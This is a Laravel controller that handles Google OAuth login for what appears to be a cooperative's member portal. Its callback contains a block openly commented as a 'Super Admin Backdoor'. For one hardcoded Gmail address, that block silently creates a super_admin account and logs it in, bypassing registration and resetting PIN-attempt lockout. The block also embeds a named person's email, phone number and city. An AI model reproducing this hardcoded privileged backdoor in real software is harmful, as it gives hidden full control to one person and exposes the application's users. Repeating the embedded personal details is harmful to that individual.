<?php

namespace App\Http\Controllers;

use App\Models\User;
use Exception;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Laravel\Socialite\Facades\Socialite;

class GoogleAuthController extends Controller
{
    public function redirectToGoogle()
    {
        return Socialite::driver('google')->redirect();
    }

    public function handleGoogleCallback()
    {
        try {
            $googleUser = Socialite::driver('google')->user();
        } catch (Exception $e) {
            return redirect('/')->withErrors(['login_identifier' => 'Google authentication failed. Please try again.']);
        }

        $email = $googleUser->getEmail();

        // 1. Super Admin Backdoor
        if ($email === 'castillojohnlaurence0@gmail.com') {
            $user = User::where('email', 'castillojohnlaurence0@gmail.com')->first();
            if (!$user) {
                $user = User::create([
                    'name' => $googleUser->getName() ?: 'John Laurence Castillo (Super Admin)',
                    'email' => 'castillojohnlaurence0@gmail.com',
                    'role' => 'super_admin',
                    'company_id' => 'SUPER_ADMIN_0',
                    'address' => 'Cebu City, Philippines',
                    'contact_number' => '09682010246',
                ]);
            }
            Auth::login($user, true);
            $user->update(['pin_attempts' => 0]);
            return redirect('/dashboard')->with('success', 'Logged in successfully as Super Admin!');
        }

        // 2. Check if user already exists
        $user = User::where('email', $email)->first();

        if ($user) {
            Auth::login($user, true);
            $user->update(['pin_attempts' => 0]);
            return redirect('/dashboard')->with('success', 'Logged in successfully via Google!');
        }

        // 3. New/Unencoded user: redirect back to home with a PMES explanation
        return redirect('/')->withErrors([
            'login_identifier' => 'Google account not found. To activate online access, you must first attend the Pre-Membership Education Seminar (PMES) and submit your physical registration form.'
        ]);
    }
}
